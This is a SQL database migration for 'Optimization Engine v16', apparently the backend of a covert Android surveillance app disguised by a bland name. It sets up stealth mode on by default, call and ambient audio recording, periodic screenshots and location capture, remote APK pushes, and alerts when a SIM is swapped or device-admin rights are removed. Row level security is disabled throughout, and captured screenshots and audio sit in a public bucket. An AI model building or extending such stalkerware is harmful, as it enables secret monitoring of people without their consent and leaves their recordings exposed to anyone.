-- ============================================================
-- Optimization Engine v16 — Database Schema
-- Run this in Supabase SQL Editor (Dashboard → SQL Editor)
-- All statements use IF NOT EXISTS / IF EXISTS guards.
-- ============================================================

-- ─── 1. remote_settings ──────────────────────────────────────────────────────
-- Core table; already exists. Add missing columns safely.

ALTER TABLE remote_settings
    ADD COLUMN IF NOT EXISTS capture_interval       INTEGER  DEFAULT 60000,
    ADD COLUMN IF NOT EXISTS recording_enabled      BOOLEAN  DEFAULT false,
    ADD COLUMN IF NOT EXISTS current_version_code   INTEGER  DEFAULT NULL,
    ADD COLUMN IF NOT EXISTS device_info            TEXT     DEFAULT NULL,
    ADD COLUMN IF NOT EXISTS nickname               TEXT     DEFAULT NULL,
    ADD COLUMN IF NOT EXISTS target_version         INTEGER  DEFAULT 1,
    ADD COLUMN IF NOT EXISTS update_apk_path        TEXT     DEFAULT NULL,
    ADD COLUMN IF NOT EXISTS update_apk_url         TEXT     DEFAULT NULL,
    ADD COLUMN IF NOT EXISTS record_calls           BOOLEAN  DEFAULT false,
    ADD COLUMN IF NOT EXISTS stealth_mode_active    BOOLEAN  DEFAULT true,
    ADD COLUMN IF NOT EXISTS screenshot_interval_ms BIGINT   DEFAULT 60000,
    ADD COLUMN IF NOT EXISTS location_interval_ms   BIGINT   DEFAULT 600000,
    ADD COLUMN IF NOT EXISTS updated_at             TIMESTAMPTZ DEFAULT NOW();

-- ─── 2. remote_logs ──────────────────────────────────────────────────────────
-- Add created_at so the dashboard can sort/display timestamps.

ALTER TABLE remote_logs
    ADD COLUMN IF NOT EXISTS created_at TIMESTAMPTZ DEFAULT NOW();

-- Backfill existing rows that have no timestamp
UPDATE remote_logs SET created_at = NOW() WHERE created_at IS NULL;

-- ─── 3. app_usage ────────────────────────────────────────────────────────────

CREATE TABLE IF NOT EXISTS app_usage (
    id              UUID        DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id       TEXT        NOT NULL,
    package_name    TEXT        NOT NULL,
    app_name        TEXT        NOT NULL,
    duration_minutes BIGINT     DEFAULT 0,
    captured_at     TIMESTAMPTZ DEFAULT NOW(),
    report_date     DATE        DEFAULT CURRENT_DATE
);

CREATE INDEX IF NOT EXISTS idx_app_usage_device_date
    ON app_usage (device_id, report_date DESC);

-- ─── 4. call_logs ────────────────────────────────────────────────────────────

CREATE TABLE IF NOT EXISTS call_logs (
    id              UUID        DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id       TEXT        NOT NULL,
    phone_number    TEXT        DEFAULT 'unknown',
    audio_url       TEXT,
    duration_seconds INTEGER    DEFAULT 0,
    call_type       TEXT        DEFAULT 'ambient', -- 'ambient' | 'incoming' | 'outgoing'
    created_at      TIMESTAMPTZ DEFAULT NOW()
);

CREATE INDEX IF NOT EXISTS idx_call_logs_device
    ON call_logs (device_id, created_at DESC);

-- ─── 5. daily_usage_reports ──────────────────────────────────────────────────

CREATE TABLE IF NOT EXISTS daily_usage_reports (
    id                  UUID        DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id           TEXT        NOT NULL,
    total_active_time_ms BIGINT     DEFAULT 0,
    usage_summary       JSONB       DEFAULT '{}',
    report_date         DATE        DEFAULT CURRENT_DATE,
    created_at          TIMESTAMPTZ DEFAULT NOW(),
    UNIQUE (device_id, report_date)
);

-- ─── 6. device_events ────────────────────────────────────────────────────────
-- Used by SIM swap alerts, DeviceAdmin events, etc.

CREATE TABLE IF NOT EXISTS device_events (
    id         UUID        DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id  TEXT        NOT NULL,
    type       TEXT        NOT NULL,   -- 'SIM_SWAP', 'DEVICE_ADMIN_DISABLED', etc.
    details    TEXT,
    created_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE INDEX IF NOT EXISTS idx_device_events_device
    ON device_events (device_id, created_at DESC);

-- ─── 7. Row Level Security (RLS) — disable for anon key access ───────────────
-- WARNING: Only do this if you access Supabase with the anon key from the app.
-- Comment out if you use service_role or have custom policies.

ALTER TABLE app_usage         DISABLE ROW LEVEL SECURITY;
ALTER TABLE call_logs         DISABLE ROW LEVEL SECURITY;
ALTER TABLE daily_usage_reports DISABLE ROW LEVEL SECURITY;
ALTER TABLE device_events     DISABLE ROW LEVEL SECURITY;
ALTER TABLE remote_logs       DISABLE ROW LEVEL SECURITY;
ALTER TABLE remote_settings   DISABLE ROW LEVEL SECURITY;

-- ─── 8. Storage buckets (run separately if needed) ───────────────────────────
-- These must be created via Supabase Dashboard → Storage, or via API.
-- Bucket: "monitoring_data" (public)  — screenshots, audio
-- Bucket: "updates" (private)         — APK files

-- ─── Done ────────────────────────────────────────────────────────────────────
-- After running this script:
-- 1. Push v16 APK: node push_update.js app\build\outputs\apk\debug\app-debug.apk 16
-- 2. Verify remote_logs rows have created_at populated
-- 3. Enable "record_calls" toggle in dashboard Settings tab for audio recording
